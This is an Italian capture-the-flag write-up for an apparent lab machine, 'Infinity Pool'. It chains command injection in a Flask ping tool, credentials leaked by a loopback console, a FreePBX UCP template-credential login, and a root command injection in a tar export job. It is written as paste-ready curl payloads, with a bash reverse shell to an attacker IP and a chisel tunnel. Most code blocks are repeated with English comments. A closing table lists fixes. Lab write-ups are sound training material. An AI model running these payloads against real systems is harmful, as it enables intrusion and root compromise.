Infinity Pool: dal netcheck alla root, passando per un centralino

Il bordo di una infinity pool non si vede — e nemmeno il confine di questa macchina. Un pannello «pool ops» offre un innocuo controllo di rete che finisce dritto in una shell; da lì la strada attraversa tre servizi che si parlano solo in loopback: un edge in Flask, una console di sorveglianza che perde credenziali, e un microservizio che gira come root. La chiave per l'ultimo passo non è in un file: arriva come messaggio in segreteria su un FreePBX. Qui sotto ogni comando è pronto da incollare, sostituendo <target> col tuo IP.

// TL;DR
  • Command injection nel netcheck /internal/netcheck (ping -c 1 {host} con shell=True) → RCE come web e user flag.
  • Servizi in loopback: una console (:3000) perde le credenziali UCP; un microservizio di automazione (:9000) gira come root ma vuole un Bearer token.
  • FreePBX 16 · CVE-2026-46376: l'utente FreePBXUCPTemplateCreator sono credenziali del template UCP hard-coded. Login all'UCP — e il login è AJAX, non un form-POST.
  • La chiave è una segreteria: il Bearer token dell'automazione è il Caller ID di un messaggio vocale nell'INBOX (command=grid).
  • Root: il job /jobs/export infila il parametro report in un tar czf ... senza sanificarlo → command injection come root.

[01] Ricognizione

Una sola porta interessante: un'app Flask servita da gunicorn sulla 80. La home è un pannello «Closed Circuit — pool ops»; una pagina /status espone un piccolo strumento di diagnostica di rete che fa un ping a un host a scelta. Ogni volta che un'app ti lascia scegliere cosa «pingare», la prima domanda è: come costruisce il comando?

# scan
nmap -Pn -sV -p- <target>
80/tcp open  http  gunicorn (Flask)

# la home e la pagina di status
curl -s http://<target>/ | grep -i -o 'pool ops\|netcheck\|status'
curl -s http://<target>/status | grep -i 'name="host"'
<input name="host" ...>   # c'e un campo host: candidato per l'injection

[02] Command injection → foothold (web)

Il netcheck accetta un host in POST su /internal/netcheck e lo passa a ping. Se lo fa con shell=True e senza sanificazione, un ; mi lascia appendere un secondo comando. Provo subito con id: l'output compare nella pagina di risposta, tra le statistiche del ping.

# la injection: chiudo l'host con ; e appendo il mio comando
curl -s http://<target>/internal/netcheck \
     --data-urlencode 'host=127.0.0.1; id' | sed 's/<[^>]*>//g' | grep uid
uid=1001(web) gid=1001(web) groups=1001(web)   # RCE confermata

# la user flag e nella home di web
curl -s http://<target>/internal/netcheck \
     --data-urlencode 'host=127.0.0.1; cat /home/web/user.txt' | sed 's/<[^>]*>//g' | grep THM
THM{████████████████████}   # oscurata: policy
# the injection: close host with ; and append my command
curl -s http://<target>/internal/netcheck \
     --data-urlencode 'host=127.0.0.1; id' | sed 's/<[^>]*>//g' | grep uid
uid=1001(web) gid=1001(web) groups=1001(web)   # RCE confirmed

# the user flag is in web's home
curl -s http://<target>/internal/netcheck \
     --data-urlencode 'host=127.0.0.1; cat /home/web/user.txt' | sed 's/<[^>]*>//g' | grep THM
THM{████████████████████}   # redacted: policy

Confermo leggendo il sorgente dell'app (è world-readable): la conferma nera su bianco del perché funziona.

# il sorgente dell'edge conferma shell=True
curl -s http://<target>/internal/netcheck \
     --data-urlencode 'host=;cat /var/www/infinity_pool/edge/app.py' | sed 's/<[^>]*>//g'

proc = subprocess.run(f"ping -c 1 {host}", shell=True, ...)   # host non sanificato
# the edge source confirms shell=True
curl -s http://<target>/internal/netcheck \
     --data-urlencode 'host=;cat /var/www/infinity_pool/edge/app.py' | sed 's/<[^>]*>//g'

proc = subprocess.run(f"ping -c 1 {host}", shell=True, ...)   # host unsanitised
# opzionale ma comodo: una reverse shell come web (i passi [03]-[08] girano sul box)
# sul TUO box, in ascolto:
nc -lvnp 4444
# poi inietta il callback nel netcheck (sostituisci <attacker> col tuo IP tun0):
curl -s http://<target>/internal/netcheck \
     --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1"'
web@infinity-pool:~$   # shell interattiva come web
# optional but handy: a reverse shell as web (steps [03]-[08] run on the box)
# on YOUR box, listening:
nc -lvnp 4444
# then inject the callback into the netcheck (swap <attacker> for your tun0 IP):
curl -s http://<target>/internal/netcheck \
     --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1"'
web@infinity-pool:~$   # interactive shell as web
// se il callback non arriva

Non è il payload: su alcune VPN THM è il ufw della tua macchina a droppare l'inbound — sblocca con sudo ufw allow in on tun0 to any port 4444 proto tcp. In alternativa, tutto il runbook si può eseguire senza reverse shell, incollando ogni comando nel canale di injection: --data-urlencode 'host=127.0.0.1; <comando>' e ripulendo l'HTML con sed 's/<[^>]*>//g'.

[03] Ricognizione interna: i servizi in loopback

Con una shell sul box, la prima mossa è guardare cosa ascolta solo in locale — è lì che la macchina nasconde la catena. Tre servizi oltre all'edge: una console su :3000, un'automazione su :9000, e un Apache/FreePBX su :8080.

# porte in ascolto (tutte in loopback tranne l'edge :80)
ss -ltnp
127.0.0.1:3000   # cc-watchtower  (utente svc-watch)
127.0.0.1:9000   # cc-automation  (utente ROOT)
127.0.0.1:8080   # apache2 / FreePBX

# chi gira come cosa
ps -eo user,cmd | grep -E 'gunicorn|automation|watchtower' | grep -v grep
root ... /var/www/infinity_pool/automation/venv/bin/gunicorn --bind 127.0.0.1:9000   # :9000 e ROOT
# listening ports (all loopback except the :80 edge)
ss -ltnp
127.0.0.1:3000   # cc-watchtower  (user svc-watch)
127.0.0.1:9000   # cc-automation  (user ROOT)
127.0.0.1:8080   # apache2 / FreePBX

# who runs as what
ps -eo user,cmd | grep -E 'gunicorn|automation|watchtower' | grep -v grep
root ... /var/www/infinity_pool/automation/venv/bin/gunicorn --bind 127.0.0.1:9000   # :9000 is ROOT

[04] La console che perde le credenziali

La console di sorveglianza (cc-watchtower, utente svc-watch) è di sola lettura: espone /api/health e /api/config. Ma il config dice più di quanto dovrebbe — comprese le credenziali del portale telefonico e l'endpoint dell'automazione.

curl -s http://127.0.0.1:3000/api/config | python3 -m json.tool
"telephony_user": "FreePBXUCPTemplateCreator",
"telephony_pass": "St4yN0t1c3d_████",        # mascherata: policy
"telephony_portal": "http://127.0.0.1:8080/ucp",
"automation_endpoint": "http://127.0.0.1:9000",
"ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE."

# l'automazione: /jobs/export vuole un Bearer token che ancora non ho
curl -s http://127.0.0.1:9000/health | python3 -m json.tool | grep -A2 jobs
"POST /jobs/export": {"auth": "Authorization: Bearer <automation key>"}
curl -s http://127.0.0.1:3000/api/config | python3 -m json.tool

L'ops_note non è colore: è il cartello che indica la strada. «UCP ancora sui creds di default del template» significa quella è la porta. La password trapelata, invece, è un depistaggio parziale — non funziona su su, SSH, MySQL o l'AMI di Asterisk (vedi sotto).

[05] Vicoli ciechi (per non perderci tempo)

Prima di seguire la pista giusta, ecco cosa non paga — testato, così tu non lo ripeti. La macchina è costruita per spingerti verso l'UCP, non verso il riuso di credenziali o una priv-esc locale classica.

[06] FreePBX UCP: CVE-2026-46376 e il login AJAX

La :8080 è FreePBX 16.0.45. L'utente FreePBXUCPTemplateCreator è il tell della CVE-2026-46376: credenziali hard-coded nel template generico dell'UCP che ti fanno entrare dritto nel User Control Panel. Il problema pratico: il login via curl rimbalza sempre alla pagina di login — perché non è il form-POST che sembra. Il form è decorativo; il vero login è una chiamata AJAX a ucp/ajax.php con module=User&command=login.

U=http://127.0.0.1:8080/ucp

# la password l'ha gia rivelata /api/config: la catturo (niente segreti da incollare)
PASS=$(curl -s http://127.0.0.1:3000/api/config | python3 -c 'import sys,json;print(json.load(sys.stdin)["telephony_pass"])')

# 1) cookie di sessione + token CSRF (estrazione robusta all'ordine degli attributi)
curl -s -c cj $U/ > login.html
TOK=$(grep -oiE 'name="token"[^>]*value="[^"]+"|value="[^"]+"[^>]*name="token"' login.html | grep -oE 'value="[^"]+"' | head -1 | sed 's/value="//;s/"//')
[ -n "$TOK" ] || echo 'CSRF token non trovato -- controlla login.html'

# 2) login VERO: POST all'endpoint AJAX (non al form)
curl -s -b cj -c cj $U/ajax.php \
     --data-urlencode "token=$TOK" \
     --data-urlencode 'username=FreePBXUCPTemplateCreator' \
     --data-urlencode "password=$PASS" \
     --data-urlencode 'module=User' --data-urlencode 'command=login'
{"status":true,"message":"","token":"..."}   # sessione autenticata in cj
U=http://127.0.0.1:8080/ucp

# the password was already revealed by /api/config: capture it (no secrets to paste)
PASS=$(curl -s http://127.0.0.1:3000/api/config | python3 -c 'import sys,json;print(json.load(sys.stdin)["telephony_pass"])')

# 1) session cookie + CSRF token (extraction robust to attribute order)
curl -s -c cj $U/ > login.html
TOK=$(grep -oiE 'name="token"[^>]*value="[^"]+"|value="[^"]+"[^>]*name="token"' login.html | grep -oE 'value="[^"]+"' | head -1 | sed 's/value="//;s/"//')
[ -n "$TOK" ] || echo 'CSRF token not found -- check login.html'

# 2) the REAL login: POST to the AJAX endpoint (not the form)
curl -s -b cj -c cj $U/ajax.php \
     --data-urlencode "token=$TOK" \
     --data-urlencode 'username=FreePBXUCPTemplateCreator' \
     --data-urlencode "password=$PASS" \
     --data-urlencode 'module=User' --data-urlencode 'command=login'
{"status":true,"message":"","token":"..."}   # authenticated session in cj
// perche curl basta (niente browser)

Il writeup «da manuale» tunnella le porte con chisel e usa un browser perché il login gira in JavaScript. Ma il JS non fa magie: serializza il form e lo POSTa a ajax.php con module=User&command=login. Replicata la chiamata, curl entra da solo — più veloce e senza tunnel. Se preferisci il browser, va benissimo lo stesso: ./chisel client <attacker>:9999 R:8080:127.0.0.1:8080 e naviga su http://127.0.0.1:8080/ucp/.

[07] La chiave è in segreteria

Dentro l'UCP, l'utente ha un'estensione (9919988) e una casella vocale. Il modulo Voicemail espone un comando grid che restituisce i messaggi in JSON — Caller ID compreso. E il Caller ID del messaggio nell'INBOX è il Bearer token dell'automazione. Un tocco di classe, per una macchina a tema telefonia.

# stessa sessione (cj): elenca i messaggi dell'estensione 9919988
curl -s -b cj "$U/ajax.php?module=voicemail&command=grid\
&ext=9919988&folder=INBOX&order=desc&sort=date&offset=0&limit=100" \
  | python3 -m json.tool | grep -i callerid
"callerid": "\"Automation Key cc_auto_████\" <9000>"   # ecco il Bearer token
# same session (cj): list extension 9919988's messages
curl -s -b cj "$U/ajax.php?module=voicemail&command=grid\
&ext=9919988&folder=INBOX&order=desc&sort=date&offset=0&limit=100" \
  | python3 -m json.tool | grep -i callerid
"callerid": "\"Automation Key cc_auto_████\" <9000>"   # there's the Bearer token
// perche curl legge la segreteria e web no

Lo spool in /var/spool/asterisk/voicemail/... è di proprietà di asterisk e web non lo legge. Ma l'UCP gira dentro Apache come asterisk: autenticato, glielo chiedi e te lo serve. È il classico «confused deputy» — non serve leggere il file, basta chiederlo a chi può.

[08] Root via il job di export

Ho il Bearer token, e l'automazione gira come root. /jobs/export accetta un JSON {"report":"..."}. Provo con un nome innocuo: la risposta ci consegna il gioco, perché fa l'echo del comando che costruisce.

# cattura il Bearer token dal Caller ID della segreteria (niente segreti da incollare)
K=$(curl -s -b cj "$U/ajax.php?module=voicemail&command=grid&ext=9919988&folder=INBOX&order=desc&sort=date&offset=0&limit=100" | grep -oE 'cc_auto_[a-f0-9]+' | head -1)

# 1) prova innocua: guarda il comando che costruisce
curl -s -X POST http://127.0.0.1:9000/jobs/export \
     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \
     -d '{"report":"test"}'
"command": "tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1"

# 2) il mio report finisce dritto nel comando: chiudo il tar, appendo id, # commenta il resto
curl -s -X POST http://127.0.0.1:9000/jobs/export \
     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \
     -d '{"report":"x.tgz /var/automation/data; id #"}'
"output": "uid=0(root) gid=0(root) groups=0(root) ..."   # esecuzione come ROOT
# capture the Bearer token from the voicemail Caller ID (no secrets to paste)
K=$(curl -s -b cj "$U/ajax.php?module=voicemail&command=grid&ext=9919988&folder=INBOX&order=desc&sort=date&offset=0&limit=100" | grep -oE 'cc_auto_[a-f0-9]+' | head -1)

# 1) harmless probe: look at the command it builds
curl -s -X POST http://127.0.0.1:9000/jobs/export \
     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \
     -d '{"report":"test"}'
"command": "tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1"

# 2) my report lands straight in the command: close the tar, append id, # comments out the rest
curl -s -X POST http://127.0.0.1:9000/jobs/export \
     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \
     -d '{"report":"x.tgz /var/automation/data; id #"}'
"output": "uid=0(root) gid=0(root) groups=0(root) ..."   # execution as ROOT

Stesso schema, cambio solo il comando: leggo la root flag.

curl -s -X POST http://127.0.0.1:9000/jobs/export \
     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \
     -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
THM{████████████████████}   # oscurata: policy
curl -s -X POST http://127.0.0.1:9000/jobs/export \
     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \
     -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
THM{████████████████████}   # redacted: policy
// flag — OSCURATA
THM{████████████████████}

La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo Enter lo batti tu.

[09] Difesa

DebolezzaCorrezione
shell=True con input utente nel netcheckniente shell: subprocess.run(["ping","-c","1",host]) e validazione dell'host (allowlist / ipaddress)
La console perde credenziali su /api/configmai restituire segreti in chiaro; separare config da secret, e ruotare i default
Credenziali UCP hard-coded (CVE-2026-46376)patchare FreePBX, forzare il cambio password al primo accesso, rimuovere gli utenti template
Bearer token consegnato via Caller ID / segreteriai segreti non transitano nei metadati telefonici; token effimeri e legati al servizio
report concatenato in tar come rootnome file su allowlist, niente shell, e far girare il job con privilegi minimi (non root)
// verdetto

Due volte lo stesso errore — input utente in una shell — agli estremi opposti della catena, tenuti insieme da segreti che viaggiano dove non dovrebbero (un config verboso, una segreteria telefonica). Nessun passo è esotico; è la fiducia in loopback a fare il danno: «tanto è solo interno» smette di valere nell'istante in cui metti piede sul box. In una frase: un servizio non è sicuro perché ascolta su 127.0.0.1 — lo è solo se non si fida di chi gli parla.
